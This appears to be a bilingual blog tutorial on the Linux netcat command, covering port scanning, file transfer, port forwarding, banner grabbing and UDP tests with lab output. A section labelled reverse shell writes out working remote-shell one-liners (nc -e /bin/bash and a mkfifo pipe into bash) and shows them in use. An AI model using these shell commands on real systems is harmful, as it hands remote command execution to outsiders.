---
date: '2025-05-21T18:20:03+08:00'
draft: false
title: 'Master Netcat'
---

# Mastering the `nc` (Netcat) Command in Linux

Netcat (`nc`)  allows you to read and write data across network connections using TCP or UDP protocols. 

---

## **Table of Contents**
- [Mastering the `nc` (Netcat) Command in Linux](#mastering-the-nc-netcat-command-in-linux)
  - [**Table of Contents**](#table-of-contents)
  - [**What is Netcat?**](#what-is-netcat)
  - [**Basic Syntax and Options**](#basic-syntax-and-options)
  - [**Common Use Cases**](#common-use-cases)
    - [**1. Port Scanning** 端口扫描](#1-port-scanning-端口扫描)
    - [**2. Creating a Chat Server** 聊天服务器](#2-creating-a-chat-server-聊天服务器)
    - [**3. File Transfer** 传输文件](#3-file-transfer-传输文件)
    - [**4. Port Forwarding** 端口转发](#4-port-forwarding-端口转发)
    - [**5. Banner Grabbing** 服务类型抓取](#5-banner-grabbing-服务类型抓取)
    - [**6. Testing UDP Services** UDP 测试](#6-testing-udp-services-udp-测试)
    - [**7. Reverse Shell (Ethical Hacking)** 反向 shell](#7-reverse-shell-ethical-hacking-反向-shell)
      - [服务端1](#服务端1)
      - [客户端1](#客户端1)
      - [服务端2](#服务端2)
      - [客户端2](#客户端2)
- [References](#references)

---

## **What is Netcat?**
Netcat is a versatile tool for:
- Network debugging
- Port scanning
- File transfers
- Simple proxying
- Banner grabbing
- Reverse shells

It works with both TCP (default) and UDP protocols. Some versions include `ncat` (Nmap Project) or `cryptcat` (with encryption).

---

## **Basic Syntax and Options**
```bash
nc [options] hostname port
```

**Common Options:**
- `-z`: `Zero-I/O` mode, report connection status only,Scan mode (no data exchange). 
- `-v`: `--verbose` output
- `-u`: `--udp` UDP protocol
- `-l`: `--listen` Bind and listen for incoming connections
- `-p`: `--source-port` Specify source port to use
- `-w`: `--wait`,   Connect timeout
- `-k`: `--keep-open`, accept multiple connections in listen mode
- `-n`: `--no-dns`, skip DNS resolution (faster).
- `-e`: `--exec` <command>       Executes the given command

---

## **Common Use Cases**

### **1. Port Scanning** 端口扫描
Check if a port or range of ports is open:
```bash
# Scan a single port
nc -zv github.com 80

Connection to github.com port 80 [tcp/http] succeeded!

# Scan ports 20-100
nc -zv example.com 20-100
```


### **2. Creating a Chat Server** 聊天服务器
Set up a simple chat between two machines:
```bash
# Listener (Server)
nc -lvp 1234

# Client (Connect to Server)
nc 192.168.1.10 1234
```
Type messages on either side and press `Enter`. Exit with `Ctrl+C`.

### **3. File Transfer** 传输文件
Transfer files over a network:
```bash
# Sender (Client)
nc -nv example.com 4444 < file.txt

# Receiver (Server)
nc -lvnp 4444 > received.txt
```
**Directory Example:**
```bash
# Compress and send
tar -czf - /path/to/dir | nc -lvp 5555

# Receive and extract
nc 192.168.1.10 5555 | tar -xzf -
```

### **4. Port Forwarding** 端口转发

**Forward traffic from local port 8080 to a remote server:**
```bash
# Local Forwarder
nc -lvp 8080 | nc remotehost 80
```

**例子**


```bash
[root@node96 ~]# nc -lvp  9999
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.200.97.
Ncat: Connection from 10.10.200.97:50360.
aaaaaaa

```

```bash
[root@node97 ~]# nc -lvp 8888 | nc 10.10.200.96 9999
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.200.97.
Ncat: Connection from 10.10.200.97:34254.
```

```bash
[root@node97 ~]# nc 10.10.200.97 8888
aaaaaaa

```



**Bidirectional Forwarding (Advanced):**
```bash
mkfifo pipe
nc -lvp 8080 < pipe | nc remotehost 80 > pipe
```

### **5. Banner Grabbing** 服务类型抓取
Retrieve service banners for reconnaissance:
```bash
[root@node96 ~]# nc -v 10.10.200.96 22
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.200.96:22.
SSH-2.0-OpenSSH_7.4


```

### **6. Testing UDP Services** UDP 测试
Test UDP-based services (e.g., DNS):
```bash
[root@node96 ~]# nc -uvz 1.1.1.1 53
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 1.1.1.1:53.
Ncat: UDP packet sent successfully
Ncat: 1 bytes sent, 0 bytes received in 2.02 seconds.
```
**Note:** UDP is connectionless, so responses may vary.

### **7. Reverse Shell (Ethical Hacking)** 反向 shell

#### 服务端1

```bash
[root@node96 ~]#  nc -l -vv -p 5879 -e /bin/bash
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5879
Ncat: Listening on 0.0.0.0:5879
```

#### 客户端1

```bash
[root@node97 ~]# nc -v 10.10.200.96 5879
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.200.96:5879.
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:17:86:e5 brd ff:ff:ff:ff:ff:ff
    inet 10.10.200.96/16 brd 10.10.255.255 scope global noprefixroute ens33
       valid_lft forever preferred_lft forever
    inet 10.10.123.234/16 scope global secondary ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::c51e:7f4e:355f:57d2/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

#### 服务端2

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l  8888 > /tmp/f
```

#### 客户端2

> 出现了服务端的命令行操作端, 相当危险的

```bash
[root@node97 ~]# nc -v 10.10.200.96 8888
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.200.96:8888.
[root@node96 ~]# hostname
hostname
node96
```

# References

1. [这些Linux命令，不会有人教你！](https://juejin.cn/post/7124849362563727367?searchId=202505221112142E0D23DF253184B6167E#heading-6)
2. [ncat](https://man7.org/linux/man-pages/man1/ncat.1.html)

